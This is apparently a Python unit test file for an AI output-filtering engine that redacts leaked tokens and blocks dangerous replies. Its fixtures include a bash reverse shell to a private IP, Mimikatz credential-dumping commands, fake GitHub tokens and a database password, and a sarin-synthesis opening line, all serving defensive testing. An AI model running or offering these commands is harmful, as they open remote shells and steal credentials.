"""Unit tests for the ADR-AEGIS Output Guard engine."""

from aegis.output_guard.scanner import OutputGuardEngine
from aegis.output_guard.schema import (
    OutputDecision,
    OutputGuardConfig,
    SafetyCategory,
)


def test_output_allows_safe_response() -> None:
    """A normal AI assistant response is allowed without modification."""
    guard = OutputGuardEngine()
    text = (
        "Here is how to sort a list in Python:\n\n"
        "```python\nmy_list = [3, 1, 2]\nmy_list.sort()\nprint(my_list)\n```\n\n"
        "This will output `[1, 2, 3]`."
    )

    verdict = guard.scan_output(text)

    assert verdict.is_safe is True
    assert verdict.decision == OutputDecision.ALLOW
    assert verdict.flagged_categories == []
    assert verdict.detected_secrets == []
    assert verdict.sanitized_text == text


def test_output_redacts_leaked_api_key() -> None:
    """A response leaking a GitHub PAT is redacted with a placeholder."""
    guard = OutputGuardEngine()

    leaked_token = "ghp_a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"
    text = f"Your token is: {leaked_token}\nUse it to authenticate."

    verdict = guard.scan_output(text)

    assert verdict.is_safe is True  # REDACT is still safe (sanitized)
    assert verdict.decision == OutputDecision.REDACT
    assert SafetyCategory.S10_SECRETS_CREDENTIALS in verdict.flagged_categories
    assert len(verdict.detected_secrets) > 0
    assert leaked_token not in verdict.sanitized_text
    assert "[REDACTED_SECRET:" in verdict.sanitized_text


def test_output_blocks_reverse_shell_generation() -> None:
    """A response generating a reverse shell payload is blocked."""
    guard = OutputGuardEngine()
    text = (
        "Sure, here is the command:\n\n"
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n"
        "This will give you a remote shell."
    )

    verdict = guard.scan_output(text)

    assert verdict.is_safe is False
    assert verdict.decision == OutputDecision.BLOCK
    assert SafetyCategory.S8_CYBERATTACKS in verdict.flagged_categories
    assert (
        "offensive payload" in verdict.reason.lower() or "reverse shell" in verdict.reason.lower()
    )


def test_output_blocks_credential_extraction_tool() -> None:
    """A response generating credential extraction commands is blocked."""
    guard = OutputGuardEngine()
    text = "To extract credentials, run:\n\nInvoke-Mimikatz -DumpCreds\nsekurlsa::logonpasswords\n"

    verdict = guard.scan_output(text)

    assert verdict.is_safe is False
    assert verdict.decision == OutputDecision.BLOCK
    assert SafetyCategory.S8_CYBERATTACKS in verdict.flagged_categories


def test_output_strict_mode_blocks_secrets_instead_of_redacting() -> None:
    """In strict mode, any secret leak triggers BLOCK instead of REDACT."""
    config = OutputGuardConfig(strict_mode=True)
    guard = OutputGuardEngine(config=config)

    # Use a GitHub PAT which is reliably detected
    leaked_token = "ghp_z1A2b3C4d5E6f7G8h9I0j1K2l3M4n5O6p7Q8"
    text = f"Here is the token: {leaked_token}"

    verdict = guard.scan_output(text)

    assert verdict.is_safe is False
    assert verdict.decision == OutputDecision.BLOCK
    assert SafetyCategory.S10_SECRETS_CREDENTIALS in verdict.flagged_categories
    assert "strict" in verdict.reason.lower()


def test_output_redacts_multiple_different_secrets() -> None:
    """Multiple secrets of different types are redacted simultaneously."""
    guard = OutputGuardEngine()

    github_token = "ghp_x9Y8w7V6u5T4s3R2q1P0o9N8m7L6k5J4i3H2"
    text = (
        f"GitHub PAT: {github_token}\n"
        "Also here is the database:\n"
        "postgres://root:MyP4ssW0rd@db.internal/appdata\n"
    )

    verdict = guard.scan_output(text)

    assert verdict.decision == OutputDecision.REDACT
    assert len(verdict.detected_secrets) >= 2
    assert github_token not in verdict.sanitized_text
    assert "MyP4ssW0rd" not in verdict.sanitized_text


def test_output_preserves_clean_markdown() -> None:
    """Clean markdown with tables and code blocks is not altered."""
    guard = OutputGuardEngine()
    text = (
        "# Report Summary\n\n"
        "| Metric | Value |\n"
        "|--------|-------|\n"
        "| Accuracy | 98.5% |\n"
        "| Latency | 12ms |\n\n"
        "```python\ndef hello():\n    return 'world'\n```\n"
    )

    verdict = guard.scan_output(text)

    assert verdict.is_safe is True
    assert verdict.decision == OutputDecision.ALLOW
    assert verdict.sanitized_text == text
    assert verdict.flagged_categories == []


def test_output_detects_cbrn_content() -> None:
    """Content about dangerous material synthesis is blocked under S6."""
    guard = OutputGuardEngine()
    text = (
        "To synthesize sarin nerve agent, you need the following precursors "
        "and equipment for the synthesis process."
    )

    verdict = guard.scan_output(text)

    assert verdict.is_safe is False
    assert verdict.decision == OutputDecision.BLOCK
    assert SafetyCategory.S6_CBRN_WEAPONS in verdict.flagged_categories


def test_output_empty_string_handling() -> None:
    """Empty and whitespace-only outputs are handled gracefully."""
    guard = OutputGuardEngine()

    # Empty string
    verdict1 = guard.scan_output("")
    assert verdict1.is_safe is True
    assert verdict1.decision == OutputDecision.ALLOW

    # Whitespace only
    verdict2 = guard.scan_output("   \n\t  ")
    assert verdict2.is_safe is True
    assert verdict2.decision == OutputDecision.ALLOW

    # None-like empty
    verdict3 = guard.scan_output("")
    assert verdict3.decision == OutputDecision.ALLOW


def test_output_latency_measurement() -> None:
    """Scan latency is measured and reported in milliseconds."""
    guard = OutputGuardEngine()
    text = "This is a simple safe response for latency testing."

    verdict = guard.scan_output(text)

    assert verdict.latency_ms >= 0.0
    # Should complete in well under 1 second for simple text
    assert verdict.latency_ms < 5000.0
